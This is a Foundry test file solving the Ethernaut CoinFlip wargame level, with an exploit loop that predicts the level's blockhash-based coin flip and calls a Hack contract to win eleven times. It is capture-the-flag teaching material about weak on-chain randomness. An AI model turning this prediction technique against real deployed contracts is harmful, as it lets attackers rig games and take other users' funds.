pragma solidity ^0.8.10;

import {CoinFlipFactory} from "../src/config/factories/3_CoinFlipFactory.sol";
import {CoinFlip} from "../src/3_CoinFlip/CoinFlip.sol";
import {Ethernaut} from "../src/config/Ethernaut.sol";
import {Hack} from "../src/Hack.sol";
import "forge-std/Test.sol";

contract CoinFlipTest is Test {
    Ethernaut ethernaut;
    CoinFlip ethernautCoinFlip;
    CoinFlipFactory coinFlipFactory;

    address levelAddress;
    address deployer = payable(address(1));


    function setUp() public {
        ethernaut = new Ethernaut();

        coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);

        vm.startPrank(tx.origin);
        levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        ethernautCoinFlip = CoinFlip(payable(levelAddress));
    }

    function testExploit() public {
        /** EXPLOIT END **/

        Hack hack = new Hack();

        for (uint i = 1; i <= 11; i++) {
            vm.roll(i); //block+1, then generate answer and exec:

            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / (type(uint).max/2+1);
            bool side = coinFlip == 1 ? true : false;

            hack.coinFlip(address(levelAddress), side);
        }

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}